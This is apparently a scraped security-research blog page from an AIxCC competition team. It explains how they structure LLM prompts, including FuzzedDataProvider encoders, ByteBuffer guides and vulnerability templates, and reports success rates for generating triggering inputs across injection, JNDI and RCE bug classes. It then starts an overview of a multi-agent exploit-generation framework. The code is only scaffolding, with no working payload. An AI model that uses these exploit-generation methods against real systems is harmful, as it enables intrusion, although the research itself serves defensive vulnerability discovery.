it\u0026rsquo;s also about the tricky data structures that fuzzing frameworks use. We developed specialized guides (complete implementation) for three categories of challenging structures:\nFuzzedDataProvider Structures - The complex data consumption patterns Java ByteBuffer Formats - Binary data handling Application-Specific Data Structures - Custom formats found in target applications FuzzedDataProvider Structures FuzzedDataProvider structures are particularly tricky. They consume primitive types from the end of data buffers while consuming structured data from the beginning, with specialized methods like consumeInt(min, max) for bounded value generation. It\u0026rsquo;s like trying to eat a sandwich from both ends simultaneously - you need to know exactly how much space each bite will take.\nHere\u0026rsquo;s our key insight: instead of trying to explain these complex data consumption patterns to the LLM, we built libFDP integration (GitHub) that abstracts away the implementation details. LLMs are excellent at programming, so we give them simple functions to call rather than asking them to understand the underlying binary format specifications.\nThe system provides language-specific encoders: libFDP.JazzerFdpEncoder() for Java targets (implementation) and libFDP.LlvmFdpEncoder() for C/C++ targets (implementation). Each encoder uses selective function mapping - we only include methods that are actually used in the target code, avoiding unnecessary complexity.\n\u0026lt;DATA_STRUCT_GUIDE_FOR_EXPLOIT\u0026gt; \u0026lt;description\u0026gt; FuzzedDataProvider Structure Handling: The input format consists of data consumed from the end of a buffer with specific methods. Focus only on the methods detected in the source code to avoid unnecessary complexity. \u0026lt;/description\u0026gt; \u0026lt;method_mapping\u0026gt; consumeString(int maxLength) ‚Üí produce_jstring(target: str, maxLength: int) consumeInt(int min, int max) ‚Üí produce_jint_in_range(target: int, min: int, max: int) consumeBytes(int maxLength) ‚Üí produce_jbytes(target: bytes, maxLength: int) \u0026lt;/method_mapping\u0026gt; \u0026lt;usage_example\u0026gt; from libFDP import JazzerFdpEncoder def create_payload() -\u0026gt; bytes: encoder = JazzerFdpEncoder() # Match FDP consumption pattern # For consumeString(20) encoder.produce_jstring(\u0026#34;malicious_input\u0026#34;, 20) # For consumeInt(1, 100) encoder.produce_jint_in_range(42, 1, 100) # For consumeBytes(10) encoder.produce_jbytes(b\u0026#39;\\x00\\x01\\x02\u0026#39;, 10) return encoder.finalize() \u0026lt;/usage_example\u0026gt; \u0026lt;/DATA_STRUCT_GUIDE_FOR_EXPLOIT\u0026gt; Java ByteBuffer Formats These require precise endianness handling for multi-byte integer consumption. The framework provides structured guidance (implementation) for understanding ByteBuffer\u0026rsquo;s BIG-ENDIAN byte ordering:\n\u0026lt;ByteBuffer\u0026gt; \u0026lt;description\u0026gt; ByteBuffer is a utility class in Java that specially handles integer value in BIG-ENDIAN. \u0026lt;/description\u0026gt; \u0026lt;core_principles\u0026gt; \u0026lt;principle\u0026gt;Default is BIG-ENDIAN byte order (most significant byte first)\u0026lt;/principle\u0026gt; \u0026lt;/core_principles\u0026gt; \u0026lt;methods\u0026gt; \u0026lt;primitive_getters\u0026gt; \u0026lt;method\u0026gt;getInt()\u0026lt;/method\u0026gt; \u0026lt;method\u0026gt;getLong()\u0026lt;/method\u0026gt; \u0026lt;/primitive_getters\u0026gt; \u0026lt;/methods\u0026gt; \u0026lt;example\u0026gt; \u0026lt;raw_bytes\u0026gt;[0x01, 0x02, 0x03, 0x04, 0x41, 0x42, 0x43, 0x44]\u0026lt;/raw_bytes\u0026gt; \u0026lt;code language=\u0026#34;java\u0026#34;\u0026gt; public static void fuzzerTestOneInput(byte[] data) { if (data.length \u0026lt; 4) return; // Ensure we have enough data ByteBuffer buf = ByteBuffer.wrap(data); // BIG-ENDIAN reading (default) int value = buf.getInt(); // Reads [0x01, 0x02, 0x03, 0x04] ‚Üí 0x01020304 // Use value to drive test if (value \u0026gt; 0) { processData(value); } } \u0026lt;/code\u0026gt; \u0026lt;/example\u0026gt; \u0026lt;/ByteBuffer\u0026gt; This guidance enables proper payload construction for methods like getInt() and getLong(), ensuring agents generate payloads with correct byte ordering.\nApplication-Specific Data Structures These include domain-specific formats like ServletFileUpload for multipart-based file upload processing. Due to AIxCC limitations on leveraging existing vulnerability information, we only checked the possibility of data structure summaries conservatively - preparing just one example (ServletFileUpload) to avoid violating competition rules.\nDespite this minimal testing, the approach proved particularly promising. As shown in our results table, even without actual source code, providing this single data structure summary improved File Path Traversal success from 2/10 to 9/10. This suggests a future research direction: systematically preparing summaries of all relevant data structures could provide significant benefits for vulnerability exploitation across different target applications.\n\u0026lt;ServletFileUpload\u0026gt; \u0026lt;description\u0026gt; ServletFileUpload parses HTTP requests with Content-Type: multipart/form-data, extracting parts into FileItem objects. \u0026lt;/description\u0026gt; \u0026lt;core_principles\u0026gt; \u0026lt;principle\u0026gt;Parses multipart/form-data HTTP requests\u0026lt;/principle\u0026gt; \u0026lt;principle\u0026gt;Uses DiskFileItemFactory for temporary storage management\u0026lt;/principle\u0026gt; \u0026lt;/core_principles\u0026gt; \u0026lt;example\u0026gt; \u0026lt;code language=\u0026#34;java\u0026#34;\u0026gt; ServletFileUpload upload = new ServletFileUpload( new DiskFileItemFactory(DiskFileItemFactory.DEFAULT_SIZE_THRESHOLD, tmpDir)); List\u0026lt;FileItem\u0026gt; items = upload.parseRequest(request); \u0026lt;/code\u0026gt; \u0026lt;/example\u0026gt; \u0026lt;/ServletFileUpload\u0026gt; Adaptive Context Selection The BGA framework employs adaptive knowledge integration to balance comprehensive domain expertise with computational efficiency through context-aware prompt generation strategies. Rather than overwhelming LLMs with exhaustive domain knowledge, the system selectively integrates vulnerability patterns and data structure insights based on target-specific analysis and detected patterns.\nThe integration strategy operates through two complementary principles: contextual relevance ensures that domain knowledge selection aligns with the specific vulnerability context and target characteristics, while selective application prevents information overload by focusing on detected patterns rather than applying comprehensive knowledge bases.\nThis adaptive approach enables dynamic knowledge integration based on analysis results: vulnerability categorization from BCDA guides the selection of appropriate exploit patterns, while detected data structures trigger relevant handling strategies for BlobGen, Generator, and Mutator agents. The system generates targeted prompts that incorporate only the most pertinent vulnerability patterns and structural constraints, ensuring that LLMs receive focused guidance without exceeding context limitations.\nTechnique 5: Selective Codebase Context Expansion An experimental approach that didn\u0026rsquo;t pan out\nThe Gap We Found Here\u0026rsquo;s something we discovered during competition: BGA sometimes failed on seemingly trivial vulnerabilities despite having perfect call graph coverage. Why? It was missing crucial context from methods that weren\u0026rsquo;t \u0026ldquo;on the path\u0026rdquo; to the bug but were essential for understanding input structures - like configuration setters on completely different code paths.\nOur Solution Attempt We thought we had a clever solution: use tree-sitter to identify relevant classes from the vulnerability call graph, then search across all call graphs to find methods that could potentially operate on those classes. The implementation worked - it successfully identified relevant classes and their methods.\nWhy It Didn\u0026rsquo;t Deliver But here\u0026rsquo;s the reality check: we couldn\u0026rsquo;t make this approach work effectively for several reasons. First, most related data were already captured by our code discovery agents\u0026rsquo; comprehensive browsing (more on this in an upcoming post). Second, if information wasn\u0026rsquo;t in the call graph, our filtering approach meant we couldn\u0026rsquo;t search for it anyway - a classic catch-22. Third, we simply ran out of time during competition to properly test and integrate this feature.\nThe concept remains interesting for future work. LSP tools or RAG systems with contextual embedding similarity could tackle this more effectively, though modern code browsing tools like Cursor or Claude Code probably already implement similar approaches.\nProof of Impact To demonstrate the effectiveness of our context engineering techniques, we conducted systematic evaluation on JenkinsThree (tested 05/29/2025) - our benchmark containing Jenkins repositories tailored for each vulnerability type that Jazzer can detect.\nMethodology: For each vulnerability type, we ran 10 test cases (110 total per model). Each test case used iterative refinement with up to 4 rounds, so the \u0026ldquo;Total Requests\u0026rdquo; varies based on how many iterations were needed to achieve success. These results were obtained exclusively using the BlobGen Agent - our precision-focused agent that combines systematic payload generation with coverage feedback loops.\nDomain Knowledge Integration Evaluation: The results primarily demonstrate the effectiveness of our Domain Knowledge Integration technique by comparing two context versions:\nFinal (R4): Complete vulnerability templates with exploit patterns and triggering mechanisms (JazzerSanitizer_with_exploit.yaml) R2.5 (baseline): Minimal context without domain knowledge (JazzerSanitizer_with_exploit.yaml.backup_r2.5) Context Refinement Journey: Our domain knowledge integration evolved through systematic refinement:\nR1: Basic approach requiring careful sentinel consideration (\u0026lsquo;jazze\u0026rsquo;), categorizing vulnerabilities using sanitizers, and describing how sanitizers detect vulnerabilities R2.5: Enhanced with direct vulnerability descriptions and examples, separate exploit guides with concrete examples, sentinel descriptions, and timeout/infinite vulnerability handling for complex targets like Zookeeper R4 (Final): Mature approach categorizing vulnerabilities based on human expertise rather than just sanitizer output, with concise yet comprehensive descriptions and exploit guides optimized for LLM understanding This comparison (R2.5 ‚Üí Final) isolates the impact of systematic domain knowledge refinement on LLM vulnerability exploitation capabilities.\nContext Engineering Impact: R2.5 ‚Üí Final Refinement Vulnerability Type Claude-4 (R2.5 ‚Üí Final) Claude-3.7 (R2.5 ‚Üí Final) Impact XPath Injection 10/10 ‚Üí 10/10 4/10 ‚Üí 5/10 ‚úÖ Maintained/Improved OS Command Injection 0/10 ‚Üí 10/10 0/10 ‚Üí 10/10 üöÄ Breakthrough Server Side Request Forgery 6/10 ‚Üí 8/10 10/10 ‚Üí 6/10 ‚úÖ Mixed results Regex Injection 3/10 ‚Üí 10/10 7/10 ‚Üí 10/10 üöÄ Major improvement Remote JNDI Lookup 0/10 ‚Üí 10/10 0/10 ‚Üí 10/10 üöÄ Breakthrough Reflective Call 0/10 ‚Üí 10/10 0/10 ‚Üí 10/10 üöÄ Breakthrough SQL Injection 0/10 ‚Üí 10/10 0/10 ‚Üí 3/10 üöÄ Breakthrough/Major Script Engine Injection 10/10 ‚Üí 10/10 10/10 ‚Üí 10/10 ‚úÖ Consistently high LDAP Injection 3/10 ‚Üí 4/10 7/10 ‚Üí 10/10 ‚úÖ Improved Remote Code Execution 0/10 ‚Üí 10/10 0/10 ‚Üí 10/10 üöÄ Breakthrough File Path Traversal 4/10 ‚Üí 3/10 8/10 ‚Üí 8/10 üìà With ServletFileUpload: 9/10 Key Insights from Context Refinement:\nüöÄ Breakthrough vulnerabilities (0/10 ‚Üí 10/10): Context engineering enabled discovery of previously impossible-to-reach vulnerabilities, particularly command injection and reflection-based attacks üìä Consistency across models: Both Claude-4 and Claude-3.7 achieved breakthroughs for the same vulnerability types, validating that improvements come from better context architecture, not model-specific tricks ‚ö° Efficiency gains: Final contexts required fewer generation attempts per success, reducing computational costs while improving accuracy üéØ Precision targeting: File Path Traversal improvements with ServletFileUpload demonstrate how domain-specific knowledge integration creates targeted breakthroughs Model Performance with Final Context Vulnerability Type Claude-4 Claude-3.7 Gemini-2.5-Pro O4-Mini XPath Injection 10/10 5/10 10/10 10/10 OS Command Injection 10/10 10/10 10/10 10/10 Server Side Request Forgery 8/10 6/10 10/10 10/10 Regex Injection 10/10 10/10 10/10 8/10 Remote JNDI Lookup 10/10 10/10 1/10 8/10 Reflective Call 10/10 10/10 9/10 5/10 SQL Injection 10/10 3/10 10/10 9/10 Script Engine Injection 10/10 10/10 10/10 10/10 LDAP Injection 4/10 10/10 6/10 6/10 Remote Code Execution 10/10 10/10 10/10 9/10 File Path Traversal 3/10 8/10 8/10 9/10 Model-Specific Findings:\nClaude-4: Most balanced performer - excelled at injection attacks (SQL, JNDI, Reflective Call) but struggled with File Path Traversal, suggesting strength in complex reasoning over path manipulation Claude-3.7: Complementary strengths to Claude-4 - dominated path-based vulnerabilities (File Path, LDAP) and XPath but weaker on SQL injection, indicating different architectural biases Gemini-2.5-Pro: Strong overall but with notable blind spot in Remote JNDI Lookup (1/10), demonstrating that even high-performing models can have specific vulnerability type weaknesses O4-Mini: Consistently solid across categories with particular strength in File Path Traversal, but weaker on complex reflection-based attacks requiring deeper semantic understanding Model Performance \u0026amp; Usage Metrics (Final Context) Model Success Rate Total Requests Tokens Cost Time (s) Efficiency Score* Claude-4 86.4% (95/110) 168 1.34M $3.99 468 ‚≠ê‚≠ê‚≠ê High Claude-3.7 83.6% (92/110) 170 1.43M $4.36 491 ‚≠ê‚≠ê‚≠ê High Gemini-2.5-Pro 85.5% (94/110) 158 2.53M $14.23 2,232 ‚≠ê Low O4-Mini 85.5% (94/110) 180 2.31M $4.68 1,228 ‚≠ê‚≠ê Medium *Efficiency combines cost, time, and token usage relative to success rate\nPractical Deployment Insights:\nClaude models offer the best cost-performance ratio for production deployment, achieving high success rates (~85%) with excellent efficiency metrics Gemini-2.5-Pro provides highest raw performance (85.5%) but at 3.5x the cost and 5x the execution time - suitable for scenarios where accuracy trumps efficiency Token efficiency varies significantly: Claude models consume ~1.4M tokens vs 2.3-2.5M for others, suggesting our context engineering techniques are better optimized for Claude\u0026rsquo;s architecture Request efficiency: Lower \u0026ldquo;Total Requests\u0026rdquo; indicates fewer iterations needed per success, showing that effective context engineering reduces the need for multiple refinement rounds These results validate that our systematic approach to context engineering - XML structuring, annotation systems, coverage feedback, and domain knowledge integration - delivers measurable improvements in both effectiveness and efficiency.\nImplementation Guide: Building Context Engineering Systems Ready to build your own context engineering system? Here\u0026rsquo;s the practical roadmap we\u0026rsquo;ve learned from our experience:\nStart with XML Structure Begin with this basic template for any technical context:\n\u0026lt;role\u0026gt;Define the LLM\u0026#39;s identity and mission\u0026lt;/role\u0026gt; \u0026lt;expertise\u0026gt;List relevant domain knowledge areas\u0026lt;/expertise\u0026gt; \u0026lt;objective\u0026gt;Specify exact technical requirements\u0026lt;/objective\u0026gt; \u0026lt;context\u0026gt;Ground the task in specific targets/constraints\u0026lt;/context\u0026gt; \u0026lt;methodology\u0026gt;Explain any annotation or marking systems\u0026lt;/methodology\u0026gt; This structure gives LLMs clear guidance on what they\u0026rsquo;re supposed to do and how to do it.\nAdd Execution Feedback Loops Here\u0026rsquo;s where the magic happens - closing the loop between generation and execution:\nGenerate: LLM produces code based on structured context Execute: Run code in controlled environment with coverage collection Analyze: Compare execution results against intended outcomes Refine: Update context with @VISITED markers and failure information Iterate: Repeat until success or maximum iterations Without this feedback loop, you\u0026rsquo;re essentially asking the LLM to solve problems blindfolded.\nIntegrate Domain Knowledge Contextually Don\u0026rsquo;t dump comprehensive knowledge - be selective and pattern-driven:\nScan code for specific patterns (Runtime.exec, consumeString, etc.) Load corresponding domain knowledge templates Integrate only detected patterns into context Focus on concrete examples over abstract descriptions Think of it as just-in-time learning rather than comprehensive training.\nLimitations and Future Directions AIxCC Constraints and Missed Opportunities During AIxCC, we faced a significant limitation: we couldn\u0026rsquo;t leverage existing vulnerability databases like CVE or Metasploit repositories. The competition\u0026rsquo;s purpose was discovering new vulnerabilities, not exploiting known ones, so historical vulnerability data was off-limits.\nBut here\u0026rsquo;s the exciting part - this constraint actually highlights a massive opportunity. If we could build a system using RAG (Retrieval-Augmented Generation) or Graph-RAG to systematically incorporate vulnerability knowledge bases, we believe the results could be dramatically better. Imagine a system that could:\nRetrieve relevant exploitation patterns from historical CVE data Cross-reference similar vulnerability types and their successful exploitation techniques Build knowledge graphs connecting vulnerability patterns, attack vectors, and target applications Dynamically inject the most relevant historical context for each new target This represents a promising direction for non-competitive security research where such knowledge integration would be both permitted and incredibly valuable.\nFuture Research Opportunities What we\u0026rsquo;ve built represents a fundamental shift in how we approach LLM-based technical problem solving. The techniques we\u0026rsquo;ve developed ‚Äì XML structuring, annotation systems, coverage feedback, domain knowledge integration ‚Äì enabled real vulnerability discoveries during AIxCC. But this is just the beginning.\nThe most exciting opportunities ahead include:\nAutomatic Context Optimization: Instead of hand-crafting contexts, imagine systems that learn optimal structures from execution results. The LLM could evolve its own context architecture based on what actually works.\nRAG-Enhanced Context Engineering: Integrating retrieval systems to dynamically pull in relevant vulnerability knowledge and exploitation patterns. Think of it as giving the AI access to a vast library of security expertise in real-time.\nSecurity Domain Expansion: These context engineering techniques could revolutionize vulnerability discovery across different security domains:\nAndroid App Security: Adapting our annotation systems for APK analysis, Intent fuzzing, and permission bypass detection Web Application Security: Extending coverage-driven refinement to browser-based vulnerability discovery and client-side exploitation IoT and Embedded Systems: Applying domain knowledge integration to firmware analysis and hardware-specific attack vectors Cloud Security: Developing context templates for container escapes, serverless vulnerabilities, and infrastructure misconfigurations Data Structures: Grammar-based fuzzing contexts, symbolic constraints from concolic execution, and structured input generation Protocol Security: Network protocol analysis, packet structure templates, and state machine-based vulnerability discovery Next-Generation LLM Integration: As models become more sophisticated, context engineering will evolve to leverage new capabilities while maintaining our systematic approach to information delivery.\nResources \u0026amp; Deep Dives Implementation Examples MLLA Source Code - Complete multi-agent system implementation Domain Knowledge Structures - Data structure handling guides Vulnerability \u0026amp; Exploit Guides - Context templates for vulnerability types Vulnerability Information Templates - R2.5 vs Final context evolution Related Posts BGA: Self-Evolving Exploits Through Multi-Agent AI - Overview of the multi-agent system MLLA: The Complete System - Full architecture details CPUA, MCGA, CGPA: Code Understanding and Navigation - How MLLA discovers and maps vulnerabilities Coming Soon: BCDA - The AI Detective that identifies real vulnerabilities "},{"section":"Blog","slug":"/blog/post-mlla-bga/","title":"BGA: Self-Evolving Exploits Through Multi-Agent AI","description":"How BGA&#39;s multi-agent AI framework creates self-evolving exploits that adapt and improve through coverage feedback - discovering 7 critical vulnerabilities through intelligent iteration","date":"August 29, 2025","image":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/mlla/bga_preview_hu_a384038daefd62fe.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"420\"\n          height=\"420\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/mlla\\/bga_preview_hu_8194fd1d63c99298.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","imageSM":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n          \n          \n          \n          \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/mlla/bga_preview_hu_7d505e55426d7789.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"100\"\n          height=\"100\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/mlla\\/bga_preview_hu_51057716516498c6.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","searchKeyword":"","categories":"Atlantis-Multilang","tags":"mlla, llm, exploit-generation, multi-agent, bga","content":"Why Programs Beat Payloads Here\u0026rsquo;s the problem that changed everything: you need an exploit with exactly 1000 \u0026lsquo;A\u0026rsquo; characters followed by shellcode. Ask an LLM to generate it directly, and you might get 847 A\u0026rsquo;s, maybe 1203 A\u0026rsquo;s ‚Äì never quite right. But ask it to write payload = \u0026quot;A\u0026quot; * 1000 + shellcode, and you get perfection every time.\nThis insight sparked our breakthrough during the AIxCC competition. Instead of hoping AI could guess the right attack data, we taught it to write programs that create that data. The result? Seven unique vulnerabilities discovered - exploits that evolved and adapted until they found their targets.\nThe Blob Generation Agent (BGA) framework works on a simple principle: exploits that can rewrite themselves based on what they learn are far more effective than static attacks. Each agent approaches this self-evolution differently ‚Äì some refine single payloads through iterative feedback, others generate variations and learn from collective results, still others perform surgical modifications on existing inputs.\nWhat emerged was a system where exploits literally evolve in real-time, getting smarter with each execution until they crack their target.\nBut how did we get there? It started with a fundamental rethink of how AI should approach exploit generation.\nThe Script-Based Breakthrough We kept running into the same problem: traditional vulnerability discovery forced a fundamental trade-off. Generate attacks quickly but blindly, or craft them carefully but rigidly. Fast approaches like random fuzzing rarely penetrate modern validation layers. Careful approaches like hand-crafted exploits break when software changes.\nBGA explored a different path: what if exploits could adapt themselves by generating the programs that create attacks rather than the attacks directly?\ndef create_payload() -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Instead, generate programs that create payloads.\u0026#34;\u0026#34;\u0026#34; # Build complex structures programmatically zip_file = create_zip_structure() xml_content = inject_xxe_payload() manifest = generate_valid_manifest() # Perfect format compliance every time return package_exploit(zip_file, xml_content, manifest) def generate(rnd: random.Random) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Create multiple variations systematically.\u0026#34;\u0026#34;\u0026#34; strategy = rnd.choice([\u0026#39;xxe\u0026#39;, \u0026#39;xinclude\u0026#39;, \u0026#39;schema_injection\u0026#39;]) return create_variant(strategy, rnd) def mutate(rnd: random.Random, seed: bytes) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Surgically modify existing inputs.\u0026#34;\u0026#34;\u0026#34; critical_offset = find_vulnerability_trigger(seed) return inject_at_offset(seed, critical_offset, rnd) This shift unlocks several key capabilities: handling arbitrarily complex formats (ZIP, XML, Protocol Buffers), incorporating dynamic values (checksums, lengths, timestamps), documenting reasoning in code comments, iterating based on coverage feedback, and generating thousands of variations from a single strategy.\nOnce we cracked the script-based approach, the next challenge became clear: different vulnerabilities needed different strategies. No single approach would work for everything.\nThe Four Specialists: Brief Overview The BGA framework coordinates four specialist agents, each with a different strategy for creating self-evolving exploits. Rather than competing, they complement each other ‚Äì covering different vulnerability landscapes through distinct adaptation mechanisms.\nüé≠ Orchestrator Agent: The strategic commander that receives vulnerability reports, filters redundant work, and dispatches contexts to specialized agents concurrently. It ensures no resource exhaustion and manages the coordination of all exploitation attempts.\nüéØ BlobGen Agent: The precision sniper that creates Python scripts generating targeted binary payloads. It refines single payloads through up to 4 iterations based on coverage feedback, perfect for known vulnerability paths with strict format requirements.\nüé≤ Generator Agent: The probability explorer that creates generator functions producing 20+ payload variations per iteration. It turns LLM non-determinism from weakness into strength through systematic exploration, ideal for complex formats and multiple valid attack paths.\nüîß Mutator Agent: The surgical specialist that focuses on single function transitions when full vulnerability context would exceed LLM limits. It creates targeted mutations for specific transitions, handling deep call graphs with precision.\nNow let\u0026rsquo;s dive into how we actually built these agents and the engineering challenges we solved along the way.\nBuilding the Agents: The Development Journey üé≠ Orchestrator Agent: Strategic Commander The first challenge we faced wasn\u0026rsquo;t technical ‚Äì it was logistical. With multiple agents generating exploits concurrently, we needed something to prevent chaos. The Orchestrator Agent emerged as our mission control, turning potential resource conflicts into coordinated strikes.\nThe Orchestrator receives Bug Inducing Things (BITs) from upstream analysis (BCDA) ‚Äì detailed vulnerability reports with call paths, trigger conditions, and annotated code. But not every BIT deserves attention. The Orchestrator filters aggressively:\nEliminates transitions already covered by previous fuzzing Removes duplicates across different call graphs Filters out paths without conditional branches (no mutation opportunities) Prioritizes high-value targets from recent code changes Once filtered, it transforms raw BITs into specialized contexts for each agent and dispatches work concurrently using asyncio. One BIT might spawn multiple exploitation attempts across different agents, all running in parallel. The Orchestrator ensures no resource exhaustion, no redundant work, and no cascade failures.\n‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îÇ Preprocess ‚îÇ (Create contexts, determine sanitizers, priority handling) ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îÇ ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚ñº ‚ñº ‚ñº ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îÇ BlobGenAgent ‚îÇ ‚îÇ GeneratorAgent ‚îÇ ‚îÇ MutatorAgent ‚îÇ ‚îÇ (Concurrent) ‚îÇ ‚îÇ (Concurrent) ‚îÇ ‚îÇ (Concurrent) ‚îÇ ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îÇ ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚ñº ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îÇ Finalize ‚îÇ (Aggregate results, status reporting) ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò The Orchestrator\u0026rsquo;s workflow demonstrates true concurrent execution: preprocessing contexts, dispatching to all three agents simultaneously, and aggregating results while maintaining system stability through intelligent resource management.\nüéØ BlobGen Agent: The Precision Sniper Some vulnerabilities demand surgical precision ‚Äì exact timestamps, specific byte sequences, perfect format compliance. BlobGen became our answer to these high-stakes scenarios, iteratively crafting Python scripts until they hit their target with sniper-like accuracy.\nThe Approach: Instead of generating payloads directly, BlobGen creates a Python create_payload() -\u0026gt; bytes function and refines it through up to 4 iterations based on execution results.\n‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îÇ Generate/Improve ‚îÇ‚îÄ‚îÄ‚îÄ‚ñ∂‚îÇ Collect ‚îÇ‚îÄ‚îÄ‚îÄ‚ñ∂‚îÇ Analyze ‚îÇ ‚îÇ Payload Script ‚îÇ ‚îÇ Coverage ‚îÇ ‚îÇ Failure ‚îÇ ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚ñ≤ ‚îÇ ‚îÇ ‚îÇ ‚ñº ‚îÇ ‚îÇ ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îÇ ‚îÇ ‚îÇ Finalize ‚îÇ‚óÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îÇ ‚îÇ ‚îÇ 